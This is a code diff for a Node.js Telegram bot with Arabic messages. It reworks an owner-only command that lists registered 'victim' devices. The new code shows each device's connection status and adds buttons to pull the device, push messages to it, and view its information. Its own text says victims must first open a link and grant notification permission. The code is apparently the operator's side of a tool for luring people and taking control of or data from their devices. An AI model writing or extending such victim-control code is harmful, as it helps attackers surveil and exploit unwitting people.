@@ -786,9 +786,23 @@ bot.on('message', async (msg) => {
   if (msg.text === "/pushlist") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const keys = Object.keys(pushSubs);
-    if (keys.length === 0) return bot.sendMessage(chatId, "📭 لا توجد أجهزة مسجّلة للإشعارات بعد.");
-    const list = keys.map((k,i) => `${i+1}. \`${k}\``).join("\n");
-    return bot.sendMessage(chatId, `🔔 الأجهزة المسجّلة (${keys.length}):\n\n${list}\n\nأوامر:\n/push [PID] [النص]\n/pull [PID]`, { parse_mode:"Markdown" });
+    if (keys.length === 0) return bot.sendMessage(chatId, "📭 لا توجد أجهزة مسجّلة للإشعارات بعد.\n\nيجب أن يفتح الضحية الرابط ويمنح إذن الإشعارات أولاً.");
+    for (const [i, pid] of keys.entries()) {
+      const e = pushSubs[pid] || {};
+      const online  = !!sseClients[pid];
+      const hasSub  = !!(e.subscription);
+      const status  = online ? "🟢 متصل" : hasSub ? "🟡 خلفي" : "🔴 غير متصل";
+      await bot.sendMessage(chatId,
+        `${status} — جهاز ${i+1} من ${keys.length}\n🆔 \`${pid}\``,
+        { parse_mode:"Markdown",
+          reply_markup: JSON.stringify({ inline_keyboard: [
+            [{ text:"📲 سحب الجهاز", callback_data:`pull:${pid}` }, { text:"📩 إرسال رسالة", switch_inline_query_current_chat:`/push ${pid} ` }],
+            [{ text:"📋 معلومات الجهاز", callback_data:`pushinfo:${pid}` }]
+          ] })
+        }
+      );
+    }
+    return;
   }
 
   if (msg.text?.startsWith("/pull ")) {
